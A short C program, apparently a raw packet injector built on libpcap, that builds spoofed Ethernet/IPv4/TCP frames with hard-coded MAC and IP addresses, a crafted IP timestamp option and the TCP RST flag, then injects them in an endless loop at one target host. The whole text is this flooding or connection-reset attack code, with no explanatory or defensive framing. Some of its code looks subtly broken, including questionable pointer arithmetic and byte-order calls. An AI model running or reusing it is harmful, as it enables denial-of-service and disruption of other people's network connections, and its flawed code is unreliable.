
int main(int argc, char **argv){
    char errorBuffer[PCAP_ERRBUF_SIZE];
    pcap_t *handle;
    char packet[1024];
    eth_addr_t ether_address;

    handle = pcap_open_live(argv[1], BUFSIZ, 100, 1, errorBuffer);

    /*Set up Ethernet Header */
    struct ether_header* ethhdr = (struct ether_header*) packet;

    eth_pton("0c:54:15:9d:f4:18", &ether_address);
    memcpy(&ethhdr->ether_shost, &ether_address, ETH_ADDR_LEN);

    eth_pton("7C:01:91:08:4E:BF", &ether_address);
    memcpy(&ethhdr->ether_dhost, &ether_address, ETH_ADDR_LEN);

    ethhdr->ether_type = ntohs(0x800);

    struct ip* iphdr = (struct ip*) (packet + sizeof(struct ether_header));
    iphdr->ip_v = 0b0100;
    iphdr->ip_hl = 0b1111;
    iphdr->ip_len = htons(sizeof (struct ip) + sizeof(struct tcphdr) + 84);
    iphdr->ip_id = 0b1111;
    iphdr->ip_off = 0;
    iphdr->ip_ttl = 64;
    iphdr->ip_p = 6;

    iphdr->ip_src.s_addr = inet_addr ("192.168.1.109");
    iphdr->ip_dst.s_addr = inet_addr ("192.168.1.139");

    unsigned char* options = iphdr+1;
    *options++ = 0x44;
    *options++ = 0x2;
    *options++ = 0x0d;
    *options++ = 0x25;

    struct tcphdr* tcp_header = (struct tcphdr*) (packet + sizeof(struct ether_header) + sizeof(struct ip) + 40);
    tcp_header->th_sport = ntohs(80);
    tcp_header->th_dport = ntohs(80);
    tcp_header->th_off = 0xf;
    tcp_header->th_flags = (TH_RST);
    tcp_header->th_win = ntohs(0x1);

    ip_checksum((void*) iphdr, ntohs(iphdr->ip_len));
    while(1)
        pcap_inject(handle, packet, (sizeof(struct ether_header) + sizeof(struct ip) + sizeof(struct tcphdr) + 84));
}
